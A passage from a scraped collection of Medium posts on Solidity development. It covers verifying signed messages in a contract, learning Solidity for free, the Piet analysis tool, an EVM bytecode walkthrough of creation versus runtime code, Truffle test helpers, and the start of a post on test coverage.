"author_link": "https://blog.ricmoo.com/@ricmoo", "publish_date": "2018-04-17", "last_modified_date": "2019-05-05", "readtime": "3.29", "claps": 293, "voters": 30, "content": "Signatures: Verifying Messages in SolidityRicMooFollowApr 17, 2018 \u00b7 4 min readThis is a just a short article about a question that comes up quite frequently, from people using ethers.js. How do I verify a signed message in Solidity.When a message is signed in Ethereum (e.g. using eth_signMessage), it is first prefixed with the header \\x19Ethereum Signed Message:\\n followed by the length of the message and then finally the message itself. First it is useful to understand why each of these things is done.All transactions in Ethereum are encoded using Recursive Length Prefix (RLP) encoding. Without getting too deep into the details of RLP, the \\x19 at the beginning is an intentionally invalid byte for a transaction to begin with. This prevents an application from tricking you into signing what appears to be a message, but is actually a transaction in disguise.The Ethereum Signed Message:\\n make the contents of the message human readable. Notice that this prefix is 25 characters long, which in hex is 0x19. This allows the string to be properly read as a length-prefixed string, which is bit of legacy from Bitcoin signed messages.The length included in the prefix is also largely legacy from Bitcoin, but does possibly provide some additional protection in the event of the hashing algorithm is broken, and can also assist in debugging.Once the header is prepended to the message, the message is hashed using keccak256 and that digest is signed using a secp256k1 private key.So, now we can create a function which can take a message and a signature, construct the header, compute the hash of the full payload and recover the address. (do not worry if it looks scary, you may skip it and come back to it later)contract Verifier {  // Returns the address that signed a given string message  function verifyString(string message, uint8 v, bytes32 r,              bytes32 s) public pure returns (address signer) {    // The message header; we will fill in the length next    string memory header = \"\\x19Ethereum Signed Message:\\n000000\";    uint256 lengthOffset;    uint256 length;    assembly {      // The first word of a string is its length      length := mload(message)      // The beginning of the base-10 message length in the prefix      lengthOffset := add(header, 57)    }    // Maximum length we support    require(length <= 999999);    // The length of the message's length in base-10    uint256 lengthLength = 0;    // The divisor to get the next left-most message length digit    uint256 divisor = 100000;    // Move one digit of the message length to the right at a time    while (divisor != 0) {      // The place value at the divisor      uint256 digit = length / divisor;      if (digit == 0) {        // Skip leading zeros        if (lengthLength == 0) {          divisor /= 10;          continue;        }      }      // Found a non-zero digit or non-leading zero digit      lengthLength++;      // Remove this digit from the message length's current value      length -= digit * divisor;      // Shift our base-10 divisor over      divisor /= 10;            // Convert the digit to its ASCII representation (man ascii)      digit += 0x30;      // Move to the next character and write the digit      lengthOffset++;      assembly {        mstore8(lengthOffset, digit)      }    }    // The null string requires exactly 1 zero (unskip 1 leading 0)    if (lengthLength == 0) {      lengthLength = 1 + 0x19 + 1;    } else {      lengthLength += 1 + 0x19;    }    // Truncate the tailing zeros from the header    assembly {      mstore(header, lengthLength)    }    // Perform the elliptic curve recover operation    bytes32 check = keccak256(header, message);    return ecrecover(check, v, r, s);  }}This code may look a bit complex, and uses inline EVM assembly in a few places. This should generally be frowned upon, but (as far as I know) there is no pure-Solidity way to do this efficiently.\u201cCode that drops down to inline assembly without any clear reason why will look immediately suspicious.\u201d ~Nick JohnsonOnce we have our contract deployed, it is quite simple to use from JavaScript.var ethers = require('ethers');// The message...var message = \"Hello World\";// Sign the message (this could also come from eth_signMessage)var wallet = new ethers.Wallet(privateKey);var signature = wallet.signMessage(message)// Split the signature into its r, s and v (Solidity's format)var sig = ethers.utils.splitSignature(signature);// Call the contract with the message and signaturevar promise = contract.verifyString(message, sig.v, sig.r, sig.s);promise.then(function(signer) {    // Check the computed signer matches the actual signer    console.log(signer === wallet.address);});This is a fairly simple example of this technique, mostly as a toy. But you could use this for example to have a central authority distribute signed messages, which could be redeemed as labels against an ENS registrar for custom sub-names, or to unlock specific named tokens in an ERC-721 contract.Thanks for reading! Any feedback or suggestions are welcome. Please feel free to follow me on Twitter and chime in on any of my other random thoughts.", "responses": 4, "tags": ["Ethereum", "Solidity", "Digital Signatures"]}, {"title": "How I Learned Solidity Basics as a Coding Noob for Free", "post_link": "https://medium.com/@julianrmartinez43/how-i-learned-solidity-basics-as-a-coding-noob-bc44f8acee40?source=search_post", "author_name": "Julian Martinez", "author_link": "https://medium.com/@julianrmartinez43", "publish_date": "2018-12-09", "last_modified_date": "2018-12-09", "readtime": "3.91", "claps": 376, "voters": 30, "content": "How I Learned Solidity Basics as a Coding Noob for FreeJulian MartinezFollowDec 9, 2018 \u00b7 4 min readIn this post, I discuss how I learned the basics of Solidity for free even though I previously had no coding experience.Note of caution: In this post, I show images containing Solidity code. I cannot guarantee that these examples are written securely. The purpose of these images is only to show you how I used the resources and how I learned the basics.Resourceshttps://cryptozombies.io/http://remix.ethereum.org/https://solidity.readthedocs.io/en/v0.4.25/ethereum.stackexchange.comBeginning my Journey with CryptoZombiesI began my journey with the CryptoZombies curriculum. I enjoyed this resource because the explanations of the basics were extremely clear and concise. Unlike other Solidity courses, CryptoZombies does not require prior coding experience to start learning. It also has a TON of great content.How I leveraged this resource for the greatest ROI (Return on investment)I would often get stuck on a difficult lesson. I imagine you will too. In order to complete a difficult lesson, I would revisit previous sections. Usually when I failed to complete a difficult lesson, it was because I failed to grasp concepts and small (but crucial) details in previous sections.Google and the \u201creveal answer\u201d featureThere were times when the great explanations provided by CryptoZombies was not enough. When this happened, I would consult Google. The internet is your friend. If Google didn\u2019t give me what I wanted, I used the \u201creveal answer\u201d feature on CryptoZombies. I didn\u2019t feel guilty about using this feature either.RepetitionI would frequently revisit every single lesson on CryptoZombies. The repetitions made everything easier to understand. I was able to pick up small details that had a big impact later on.Time invested in CryptoZombiesI spent about 2.5 weeks exclusively on CryptoZombies before incorporating Remix into my learning. I invested at least 1 hour a day, 5 days out of the week.Remix \u2014 Solidity IDERemix is a developer tool offered to you right in your browser. You can use it to create and test code, and even deploy smart contracts directly onto the Ethereum mainnet.How I Leveraged RemixI figured that in order to advance my understanding of Solidity, I needed to get comfortable writing code in more dynamic situations. After spending 2.5 weeks on CryptoZombies, I began complimenting my learning with Remix. CryptoZombies taught me the basics of Solidity by holding my hand. Remix allowed me to go beyond the training wheels phase by providing me a place to dynamically apply concepts that I learned in CryptoZombies.I usually utilized CryptoZombies and Remix simultaneously. At one point in the CryptoZombies curriculum, I learned how to restrict the usage of an ERC721 token (a Zombie!) to a specific user. In order to deepen my understanding of this concept, I created the DinoFighter6 contract.When I made fun contracts, I got more into it. I also made one about drifting cars.Remix Onboarding and TroubleshootingWhen I first tried to use Remix, I experienced lots of friction. I spent a lot of time troubleshooting through small things that prevented me from getting started.I made this video to walk you through the annoying stuff.Testing Your Smart Contract CodeIf your code successfully compiled, this does not mean that your code is bug free. It may still behave in a way that you did not intend. This is what makes Remix valuable to noobs. It provides us with a low friction tool to dynamically test our contracts.In order to test your contract, deploy your contract and call the functions to see if it works as expected. Remix even allows you to quickly switch between addresses, which simulates different users calling the functions.Note: If you ever plan to deploy a contract to the Ethereum mainnet, get an audit.Make Compiler Warnings Your FriendCompilers aren\u2019t meant to be a pain in the ass. If you learn how to read compiler warnings, they can help you debug your contract. I put effort into learning how to read these warnings and this gave me a good ROI.Ethereum Stack Exchange is Your FriendSometimes I encountered coding concepts or situations that I could just not figure out. I needed someone with more expertise to guide me. Ethereum Stack Exchange was an amazing resources in this regard. Ethereum Stack Exchange is a reddit-like forum where developers go to ask each other questions.They were very noob friendly and helped me overcome difficult obstacles. There is a caveat though! You cannot expect to write a half ass question and get amazing results. Remember, these developers are helping you out for free, so clearly and concisely provide them the most context possible in order to help them help you. Here is an example of how I did it.If you have any questions about troubleshooting remix, feel free to dm me or ask in the comments.Thanks to all the homiesI would like to thank all of the friends, developers and Twitter homies that helped me through this journey. I literally could not have done this on my own. Special shoutout to @TudonuMayowa for recommending Ethereum Stack Exchange. Excellent ROI.Did you like the content??? Follow me on Twitter.", "responses": 0, "tags": ["Ethereum", "Solidity", "Beginners Guide", "Remix"]}, {"title": "Analyzing Solidity Smart Contracts with Piet", "post_link": "https://blog.slock.it/analyzing-solidity-smart-contracts-with-piet-6db33a733e79?source=search_post", "author_name": "Heiko Burkhardt", "author_link": "https://blog.slock.it/@burkhardt.heiko", "publish_date": "2019-08-07", "last_modified_date": "2019-08-07", "readtime": "2.72", "claps": 305, "voters": 29, "content": "Analyzing Solidity Smart Contracts with PietHeiko BurkhardtFollowAug 7 \u00b7 3 min readIf you develop, audit, or use complex smart contracts, you may have wished for:a graphical representation of a smart contract architecture that helps you communicate with coworkers or clients (or even just document it);an easily understandable inheritance structure;a fast way to interact with contracts through a graphical user interface (e.g., read the state, send transactions, or list events);a compelling way to create smart contract documentation from NatSpec annotations.Piet, our new software, fills these needs by parsing Solidity code, graphically representing contracts and their relations, and providing a smart contract inspector.Live demoGitHub RepositoryWarning: Piet has not yet undergone in-depth testing and may contain serious bugs.Getting StartedPiet supports Solidity source files, Truffle build files, and piet container files. To load these files, click on Load in the Files tab.You can also use Piet is to retrieve the Solidity sources directly from a public GitHub repository. To do so, pass the GitHub account and repository name as the URL parameters gitHubUser andgitHubRepo. Optionally, you can use the URL parameter subDir to pass a path to the repository directory containing the contracts. This prevents Piet from scanning the complete repository for Solidity files. Similarly, you can use the parameter container to load a Piet container file.For example:https://piet.slock.it/?gitHubUser=gnosis&gitHubRepo=safe-contracts&subDir=contractshttps://piet.slock.it/?container=examples%2Fexport1562664060589.piet.jsonIf available, Piet uses an injected web3 object to interact with a blockchain. You can also use RPCs or Incubed to connect to a chain. To change the connection method, click on the connection icon in the lower-left corner.Inheritance StructureInheritance graphThis view shows the inheritance structure of the Gnosis Safe smart contracts and the structs and enumeration defined in these contracts. In the example above, the contract DailyLimitModule inherits the contract members from the contract Module and defines the struct DailyLimit.Contract InspectorCalling a functionIf a contract is selected by clicking on its name in the graph view, the contract inspector shows the member elements of the selected contract (e.g., state variables, functions, modifiers, and events). Documentation labels derived from NatSpec annotations in the Solidity code will also be shown.You can retrieve the state of a contract instance and send transactions via the contract inspector. To enable these interactions, provide the address of the contract by clicking on the edit icon and pasting the address.Piet Container FileIf you have loaded a lot of contracts, moved around the boxes in the inheritance graph, or added instance addresses to contracts you can create a Piet container file to save your work. To create a container file, click on Save in the File tab.Additional FeaturesPiet also provides the following features:Event browserNatSpec to Markdown documentation generatorNode inspection via JSON RPC callsTransaction history viewCode and ABI viewCHECK OUT PIETEvent browserNode inspectionDocumentation generator", "responses": 0, "tags": ["Ethereum", "Blockchain", "Solidity"]}, {"title": "Deconstructing a Solidity Contract \u2014 Part II: Creation vs. Runtime", "post_link": "https://medium.com/zeppelin-blog/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c?source=search_post", "author_name": "Alejandro Santander", "author_link": "https://medium.com/@_ajsantander", "publish_date": "2018-08-13", "last_modified_date": "2019-02-13", "readtime": "13.1", "claps": 399, "voters": 30, "content": "Deconstructing a Solidity Contract \u2014 Part II: Creation vs. RuntimeAlejandro SantanderFollowAug 13, 2018 \u00b7 14 min readBy Alejandro Santander in collaboration with Leo Arias.Image from commons.wikimedia.orgNote: This article is part of a series. If you haven\u2019t read the introduction, please have a look at it first. We\u2019re deconstructing the EVM bytecode of a simple Solidity contract.Deconstructing a Solidity Contract \u2014 Part I: Introduction \u2714Deconstructing a Solidity Contract \u2014 Part II: Creation vs. Runtime \u2b05Deconstructing a Solidity Contract \u2014 Part III: The Function SelectorDeconstructing a Solidity Contract \u2014 Part IV: Function WrappersDeconstructing a Solidity Contract \u2014 Part V: Function BodiesDeconstructing a Solidity Contract \u2014 Part VI: The Metadata HashLet\u2019s get started by attacking the disassembled gibberish of our contract with our divide-and-conquer lightsaber. As we saw in the introductory article, this disassembled code is very low-level, but quite readable compared to the raw bytecode. Make sure you\u2019ve followed along in the Introduction, and that you have the BasicToken contract compiled and deployed in Remix. Debug the creation transaction and open up the Instructions panel. Also, have the deconstruction diagram at hand while we go along.DISCLAIMER: All instructions provided in this article are subject to my own interpretation of how things work. Please feel free to make comments below in case I need to be corrected in any way, and I\u2019ll be sure to update the article accordingly.For now, let\u2019s focus on the JUMP, JUMPI, JUMPDEST, RETURN, and STOP opcodes, and ignore all others. Whenever we find an opcode that is not one of these, we will ignore it and skip to the next instruction, pretending that nothing intervened.When the EVM executes code, it does so top down with no exceptions \u2014 i.e., there are no other entry points to the code. It always starts from the top. It can jump around, yes, and that\u2019s exactly what JUMP and JUMPI do. JUMP takes the topmost value from the stack and moves execution to that location. The target location must contain a JUMPDEST opcode, though, otherwise execution will fail. That is the sole purpose of JUMPDEST: to mark a location as a valid jump target. JUMPI is exactly the same, but there must not be a \u201c0\u201d in the second position of the stack, otherwise there will be no jump. So this is a conditional jump. STOP completely halts execution of the contract, and RETURN halts execution too, but returns data from a portion of the EVM\u2019s memory, which is handy.So, let\u2019s start interpreting the code with all of this in mind. In Remix\u2019s debugger, move the Transaction slider all the way to the left and open up the Instructions section. You can walk through the instructions with the Step Into button (the one that looks like a little down-pointing arrow). The first instructions can be ignored, but at instruction 11 we find our first JUMPI. If it doesn\u2019t jump, it will continue through instructions 12 to 15 and end up in a REVERT, which would halt execution. But if it does jump, it will skip these instructions to the location 16 (hex 0x0010, which was pushed to the stack at instruction 8). Instruction 16 is a JUMPDEST. So far so good.Keep on stepping through the opcodes until the Transaction slider is all the way to the right. A lot of blah-blah just happened, but only in location 68 do we find a RETURN opcode (and a STOP opcode in instruction 69, just in case). This is rather curious. If you think about it, the control flow of this contract will always end at instructions 15 or 68. We\u2019ve just walked through it and determined that there are no other possible flows, so what are the remaining instructions for? (If you slide down the Instructions panel, you\u2019ll see that the code ends at location 566).The set of instructions we\u2019ve just traversed (0 to 69) is what\u2019s known as the \u201ccreation code\u201d of a contract. It will never be a part of the contract\u2019s code per se, but is only executed by the EVM once during the transaction that creates the contract. As we will soon discover, this piece of code is in charge of setting the created contract\u2019s initial state, as well as returning a copy of its runtime code. The remaining 497 instructions (70 to 566) which, as we saw, will never be reached by the execution flow, are precisely the code that will be part of the deployed contract.If you open the deconstruction diagram, you should see how we\u2019ve just made our first split: we\u2019ve differentiated creation-time vs. runtime code.We will now take a deep dive into the creation part of the code.Figure 1. Deconstruction of the creation-time EVM bytecode of BasicToken.sol.This is the most important concept to understand in this article. The creation code gets executed in a transaction, which returns a copy of the runtime code, which is the actual code of the contract. As we will see, the constructor is part of the creation code, and not part of the runtime code. The contract\u2019s constructor is part of the creation code; it will not be present in the contract\u2019s code once it is deployed.How does this magic happen? That\u2019s what we\u2019ll analyze now, step by step.Alright. So now our problem is reduced to understanding these ~70 instructions corresponding to the creation-time code.Let\u2019s re-take our top-down approach, this time understanding all the instructions as we go along, not skipping any of them. First, let\u2019s focus on instructions 0 to 2, which use the PUSH1 and MSTORE opcodes.Figure 2. The free memory pointer EVM bytecode structure.PUSH1 simply pushes one byte onto the top of the stack, and MSTORE grabs the two last items from the stack and stores one of them in memory:mstore(0x40, 0x80)       |     |       |     What to store.       Where to store.(in memory)NOTE: The above snippet is Yul-ish code. Notice how it consumes elements from the stack from left to right, always consuming what\u2019s on the top of the stack first.This basically stores the number 0x80 (decimal 128) into memory at position 0x40 (decimal 64). What for? At this point of our narrative, who cares \u00af\\_(\u30c4)_/\u00af?! There must be a reason (which we\u2019ll actually see later). For now, open the Stack and Memory panels in Remix\u2019s Debugger tab to visualize the values as you step back and forth through these instructions.You might be wondering: what happened to instructions 1 and 3? PUSH instructions are the only EVM instructions that are actually composed of two or more bytes. So, PUSH 80 is really two instructions. The mystery is revealed, then: instruction 1 is 0x80 and instruction 3 is 0x40.Next up are instructions 5 to 15.Figure 3. The non-payable check EVM bytecode structure.Here we have a bunch of new opcodes: CALLVALUE, DUP1, ISZERO, PUSH2, and REVERT. CALLVALUE pushes the amount of wei involved in the creation transaction, DUP1 duplicates the first element on the stack, ISZERO pushes a 1 to the stack if the topmost value of the stack is zero, PUSH2 is just like PUSH1 but it can push two bytes to the stack instead of just one, and REVERT halts execution.So what\u2019s going on here? In Solidity, we could write this chunk of assembly like this:if(msg.value != 0) revert();This code was not actually part of our original Solidity source, but was instead injected by the compiler because we did not declare the constructor as payable. In the most recent versions of Solidity, functions that do not explicitly declare themselves as payable cannot receive ether. Going back to the assembly code, the JUMPI at instruction 11 will skip instructions 12 through 15 and jump to 16 if there is no ether involved. Otherwise, REVERT will execute with both parameters as 0 (meaning that no useful data will be returned).Alright! Coffee break. The next part will be a bit trickier, so it might be a good idea to take a few minutes off. Go ahead and prepare yourself a nice cup of coffee while you summon your powers of concentration. Make sure you understand what we\u2019ve seen so far, because the next part is a bit more complicated.If you\u2019d like yet another way to visualize what we\u2019ve just done, try out this simple tool I\u2019ve built: solmap. It allows you to compile Solidity code on real-time and then click on EVM opcodes to highlight the associated Solidity code. The disassembly is a bit different from Remix\u2019s, but you should be able to understand it by comparison.Coffee break!Ready to move on? Great! Next up are instructions 16 to 37. Keep following with Remix\u2019s debugger. (Remember, Remix is your friend ^^).Figure 4. EVM bytecode structure for retrieving constructor parameters from code appended at the end of a contract\u2019s bytecode.The first four instructions (17 to 20) read whatever is in memory at position 0x40 and push that to the stack. If you recall from a little earlier, that should be the number 0x80. The following instructions then push 0x20 (decimal 32) to the stack (instruction 21), duplicate that value (instruction 23), push 0x0217 (decimal 535) (instruction 24), and finally duplicate the fourth value (instruction 27), which should be 0x80 again. Phew! I almost ran out breath while writing that sentence. When looking at EVM instructions like this, it\u2019s okay to not understand what\u2019s going on for a while. Don\u2019t worry, it will suddenly click in your mind.On instruction 28, CODECOPY is executed, which takes three arguments: target memory position to copy the code to, instruction number to copy from, and number of bytes of code to copy. So, in this case, it targets memory at position 0x80, from byte position 535 in code, 32 bytes of code length. Why?If you look at the entire disassembled code, there are 566 instructions. So why is this code trying to copy the last 32 bytes of code? Actually, when deploying a contract whose constructor contains parameters, the arguments are appended to the end of the code as raw hex data. Scroll down the Instructions panel all the way to see this. In this case, the constructor takes one uint256 parameter, so all this code is doing is copying the argument to memory from the value appended at the end of the code. These 32 instructions don\u2019t make sense as disassembled code, but they do in raw hex: 0x0000000000000000000000000...0000000000000000000002710. Which is, of course, the decimal value 10000 we passed to the constructor when we deployed the contract!See why you needed that coffee? Again, feel free to repeat this part in Remix step by step, making sure that you understand what just happened. The end result should be that you see the number 0x00..002710 stored in memory at position 0x80.Okay. For the next part, you might want to fix yourself a nice double measure of whisky. It\u2019s about to get weird.Whisky break!Just kidding. No more magic, I promise. It\u2019s all downhill from here.The next set of instructions (29 to 35) update the value stored in memory at position 0x40 from the number 0x80 to the number 0xa0: that is, they offset the value by 0x20 (32) bytes. Now we can start making sense of instructions 0 to 2 (remember when we shrugged?). Solidity keeps track of something called a \u201cfree memory pointer\u201d: that is, a place in memory we can use to store stuff, with the guarantee that no one will overwrite it (except us if we make a mistake, of course, using inline assembly or Yul). So, since we stored the number 10000 in the old free memory position, we updated the free memory pointer by shifting it 32 bytes forward.Even experienced Solidity developers can be confused when they see the expression \u201cfree memory pointer\u201d or the code mload(0x40, 0x80). These are just saying, \u201cWe\u2019ll be writing to memory from this point on and keeping a record of the offset, each time we write a new entry.\u201d Every single function in Solidity, when compiled to EVM bytecode, will initialize this pointer.What\u2019s in memory between 0x00 to 0x40, you may wonder. Nothing. It\u2019s just a chunk of memory that Solidity reserves for calculating hashes, which, as we\u2019ll see soon, are necessary for mappings and other types of dynamic data.Now, on instruction 37, MLOAD reads from memory at position 0x40 and basically downloads our 10000 value from memory into the stack, where it will be fresh and ready for consumption in the next set of instructions.This is a common pattern in EVM bytecode generated by Solidity: before a function\u2019s body is executed, the function\u2019s parameters are loaded into the stack (whenever possible), so that the upcoming code can consume them \u2014 and that\u2019s exactly what\u2019s going to happen next.Let\u2019s continue with instructions 38 to 55.Figure 5. The constructor\u2019s body EVM code.These instructions are nothing more and nothing less than the constructor\u2019s body: that is, the Solidity code:totalSupply_ = _initialSupply;balances[msg.sender] =  _initialSupply;The first four instructions are pretty self-explanatory (38 to 42). First, 0 is pushed to the stack, then the second item in the stack is duplicated (that\u2019s our 10000 number), and then the number 0 is duplicated and pushed to the stack, which is the position slot in storage of totalSupply_. Now, SSTORE can consume the values and still keep 10000 lying around for future use:sstore(0x00, 0x2710)        |     |       |     What to store.       Where to store.(in storage)Voila! We stored the number 10000 in the variable totalSupply_. Isn\u2019t that amaaaazing???Be sure to visualize this value in Remix\u2019s Debugger tab too. You\u2019ll find it in the Storage completely loaded panel.The next set of instructions (43 to 54) are a bit disconcerting, but will basically deal with storing 10000 in the balances mapping for the key of msg.sender. Before moving forward, make sure you understand this part of the Solidity documentation, which explains how a mapping is saved in storage. Long story short, it will concatenate the slot of the mapping value (in this case the number 1, because it\u2019s the second variable declared in the contract) with the key used (in this case, msg.sender, obtained with the opcode CALLER), then hash that with the SHA3 opcode and use that as the target position in storage. Storage, in the end, is just a simple dictionary or hash table.Moving on with instructions 43 to 45, the msg.sender address is stored in memory (this time at position 0x00), and then in instructions 46 to 50, the value 1 (the slot of the mapping) is stored at memory position 0x20. Finally, the SHA3 opcode calculates the Keccak256 hash of whatever is in memory from position 0x00 to position 0x40 \u2014 that is, the concatenation of the mapping\u2019s slot/position with the key used. This is precisely where the value 10000 will be stored in our mapping:sstore(hash..., 0x2710)       |        |       |        What to store.       Where to store.And that\u2019s it. At this point, the constructor\u2019s body has been fully executed.All this may be a bit overwhelming at first, but it\u2019s a fundamental part of how storage works in Solidity. If you didn\u2019t quite get it, I recommend that you go over it a few times following along with Remix\u2019s debugger, keeping the Stack and Memory panels in sight. Also, feel free to ask questions below. This pattern is used all over the place in EVM bytecode generated by Solidity, and you will quickly learn to identify it effortlessly. In the end, it is nothing more than calculating where to save, in storage, the value for a certain key for a mapping.Alright, we\u2019re almost done here. If you got this far, the next part will be a piece of cake.Figure 6. The runtime code copy structure.In instructions 56 to 65, we\u2019re performing a code copy again. Only this time, we\u2019re not copying the last 32 bytes of the code to memory; we\u2019re copying 0x01d1 (decimal 465) bytes starting from position 0x0046 (decimal 70) into memory at position 0. That\u2019s one big chunk of code to copy!If you slide the Transaction slider all the way to the right again, you\u2019ll notice that position 70 is right after our creation-time EVM code, where execution stopped. The runtime bytecode is contained in those 465 bytes. This is the part of the code that will be saved in the blockchain as the contract\u2019s runtime code, which will be the code that will be executed every time someone or something interacts with the contract. (We\u2019ll cover the runtime code in future parts of this series).And this is exactly what instructions 66 to 69 do: the code that we copied to memory is returned.Figure 7. The runtime code return EVM bytecode structure.RETURN grabs the code copied to memory and hands it over to the EVM. If this creation code is executed in the context of a transaction to the 0x0 address, the EVM will execute the code and store the return value as the created contract\u2019s runtime code.That\u2019s it! By now, our BasicToken contract instance will be created and deployed with its initial state and runtime code ready for use. If you take a step back and look at Figure 2, you\u2019ll see that all the EVM bytecode structures we analyzed are generic, except the one highlighted in purple: that is, they will be in creation-time bytecode generated by the Solidity compiler. What will differ from constructor to constructor is just the purple part \u2014 the constructor function\u2019s actual body. The structure that fetches parameters embedded at the end of the bytecode, as well as the structures that copy the runtime code and return it, can be considered boilerplate code and generic EVM opcode structures. You should be able to look at any constructor now, and before studying it instruction by instruction, you should have a general idea of the components that make it up.In the next article of this series, we\u2019ll look at the actual runtime code, starting with how you can interact with a contract\u2019s EVM code at different entry points. For now, give yourself a well-deserved pat on the back, because you have just digested the most difficult part of the series. You should also have developed a strong ability to read through and debug EVM bytecode, understand generic structures, and, most importantly, understand the difference between creation-time and runtime EVM bytecode. This is what makes the constructor function of a contract so special in Solidity.See you in the next episode!Deconstructing a Solidity Contract \u2014 Part I: Introduction \u2714Deconstructing a Solidity Contract \u2014 Part II: Creation vs. Runtime \u2714Deconstructing a Solidity Contract \u2014 Part III: The Function SelectorDeconstructing a Solidity Contract \u2014 Part IV: Function WrappersDeconstructing a Solidity Contract \u2014 Part V: Function BodiesDeconstructing a Solidity Contract \u2014 Part VI: The Metadata HashBe part of the communityContinue the discussion on our forumJoin our Telegram groupFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": 2, "tags": ["Ethereum", "Solidity", "Guides"]}, {"title": "Handy helper functions for Solidity Development with Truffle", "post_link": "https://medium.com/@contacttomnash/handy-helper-functions-for-solidity-development-with-truffle-39d14a371c12?source=search_post", "author_name": "Tom Nash", "author_link": "https://medium.com/@contacttomnash", "publish_date": "2017-11-13", "last_modified_date": "2018-06-12", "readtime": "3.45", "claps": 89, "voters": 18, "content": "Handy helper functions for Solidity Development with TruffleTom NashFollowNov 13, 2017 \u00b7 4 min readTruffle is pretty good. If you have written a few smart contracts chances are you\u2019ve used it or at least tried it out, but there are a few things which constantly pop up when writing test files for contracts which I find myself repeating. I\u2019ve compiled a few of the most useful snippets that I use consistently when writing tests, maybe they will be useful to someone else too.Deploying Contracts/** *  Deploys a contract with given constructor parameters; if the  *  final param is an object it is treated as the intended *  transaction object *  @param contract Contract to deploy (from artifacts.require()) *  @optional @param ...args Additional arguments, passed as general  *  comma separated args to contract.new() *  @return newContract Deployed contract instance */deploy: async (contract, ...args) => {  let txObj = _.last(args)  if (!_.isObject(txObj)) {    txObj = { from: web3.eth.accounts[0] }    args.push(txObj)  }  let newContract = await contract.new(...args)  return newContract},Often times I find myself needing to deploy a few different contracts within my tests, but the lines can be somewhat verbose. Using this little method, it\u2019s really easy to deploy multiple different contract types using the same interface:let MyContract = artifacts.require('./MyContract.sol')utils.deploy(MyContract, param1, ..., { from: someSender, ... })VM Exceptions (throw, revert(), require(), out of gas etc.)/** *  Assert that a particular Ethereum transaction throws *  @param promise Transaction operation which should throw *  @param err Error message which should be printed upon test  *  failure *  @return Promise which will resolve once the transaction has been *  completed (can be used with await) */assertThrows: (promise, err) => {  return promise.then(() => {    assert.isNotOk(true, err)  }).catch((e) => {    assert.include(e.message, 'VM Exception')  })},This isn\u2019t the most bulletproof method for checking for a VM Exception, I\u2019m sure. But it\u2019s the most reliable one that I have come across so far. I think at one point TestRPC changed its error message string, throwing off a bunch of tests, so be warned.Usage: await utils.assertThrows(myContract.someOperation(1)) . If your contract execution fails, the test will move on past this line, if it succeeds, you\u2019ll get a test failure from the assert in the catch handler.NOTE: This won\u2019t work if you\u2019re testing against a real network, only TestRPC. Bear that in mind.Time-based Contract Testing/** *  Increases the time in the EVM. Cannot be undone at the moment *  which is a bit of a pain. *  @param seconds Number of seconds to increase the time by */increaseTime: async (seconds) => {  await web3.currentProvider.send({    jsonrpc: '2.0',    method: 'evm_increaseTime',    params: [seconds],    id: Number(Math.random() * 1000).toFixed(0)  })  await utils.mineOneBlock() // optional (*)}If you have any logic in a contract which relies on block.timestamp, you\u2019ll probably want to test that without having to make a separate (non-production-version) contract to test out that little piece of logic. Luckily TestRPC allows you to increase the blocktime on it\u2019s VM by using evm_increaseTime . Unfortunately you can\u2019t roll this back yet, so you might either have to use relative dates/times in your tests or spin up some small helper which kills and restarts TestRPC after a test of this nature (so far I\u2019ve never found that necessary though).Also note the optional last line in this function, which might be necessary if your TestRPC\u2019s blocktime is 0 (no auto-mining). If you check the blocktime immediately after calling this function, it won\u2019t have changed, so you\u2019ll need to skip ahead a block for the new time to be incorporated. If you\u2019re wondering what mineOneBlock looks like, it\u2019s down below.Mining a Block/** *  Sends a request to the RPC provider to mine a single block *  synchronously */mineOneBlock: async () => {  await web3.currentProvider.send({    jsonrpc: '2.0',    method: 'evm_mine',    id: new Date().getTime()  })},Fairly self-explanatory, it tells TestRPC to mine a block for you :-)Addendum: Waiting for Events/** *  Resolves when a given event happens, or rejects after an *  optional timeout *  @param event Contract event to watch for *  @param optTimeout Optional time to wait in milliseconds (useful *  for long blocktimes) *  @return Promise which resolves when the event is seen */waitForEvent: async (event, optTimeout) => {  return new Promise((resolve, reject) => {    let timeout = setTimeout(() => {      clearTimeout(timeout)      return reject(new Error('Timeout waiting for event'))    }, optTimeout || 5000)    event.watch((e, res) => {      clearTimeout(timeout)      if (e) return reject(e)      resolve(res)    })  })}This one is a little less clear than the others IMO, and again I don\u2019t think it\u2019s bulletproof (your network might respond too fast or something) but I think it\u2019s good enough to start with. Essentially you\u2019re going to trigger the event from your test asynchronously, then wait for the event (or lack thereof, it\u2019s quite simple to make an inverted version of this function which ensures that no event was logged). Ensure that you don\u2019t await on the function which is triggering the event, otherwise it will have already been logged by the time our helper starts watching for it, and we\u2019ll always get a timeout.let myEvent = myContract.MyEvent()myContract.triggerMyEvent() // note lack of await here, important!let result = await utils.waitForEvent(myEvent) // no event = failureHope these are helpful, if you think you\u2019ll use any, I\u2019ve compiled them into an NPM module here. If you would like to contribute, please just get in touch, or open an issue on the GitHub repo.", "responses": 1, "tags": ["JavaScript", "Solidity", "Ethereum", "Truffle", "Testrpc"]}, {"title": "Testing and Code Coverage of Solidity Smart Contracts", "post_link": "https://medium.com/edgefund/testing-and-code-coverage-of-solidity-smart-contracts-660cb6291701?source=search_post", "author_name": "Gareth Oates", "author_link": "https://medium.com/@GarethOates", "publish_date": "2018-08-06", "last_modified_date": "2018-10-30", "readtime": "2.93", "claps": 162, "voters": 27, "content": "Testing and Code Coverage of Solidity Smart ContractsGareth OatesFollowAug 6, 2018 \u00b7 3 min readCode metricsIt\u2019s no secret that continuous integration and continuous deployment is an important part of the application development process. Integrating testing into this workflow is also an important part, to protect against any unwanted regression when developing new features or refactoring existing code.Having all of your unit tests go green and be passing is one thing, but it\u2019s also important to know just how much of your code-base has been covered by these tests. Having 100% passing tests is nice but if the tests only cover 10% of your code-base you\u2019re still not going to catch regression in areas which are not covered.Being able to measure just how much of your code-base is covered by tests then, is equally important.When you add in the very real possibility of financial loss if a smart contract is not properly tested and audited, it becomes even more important to make sure that every part of your code which can be tested, is tested.At EdgeFund we chose to use Travis CI as our continuous integration tool, along with coveralls to ensure that our smart contracts are tested and as close to 100% as possible covered by those tests.Travis CI is super easy to set up and use with your application. Our code is available on GitHub so we were able to connect to Travis quite simply through the GitHub interface. The process to hook up coveralls is very similar, if you\u2019re on github.Once you have your repository connected to both travis and coveralls, it\u2019s simply a case of creating a .travis.yml file which describes your build process. It should also be noted that we are using ganache-cli which is part of the truffle suite in order to provide us with a test blockchain against which to develop and test our smart 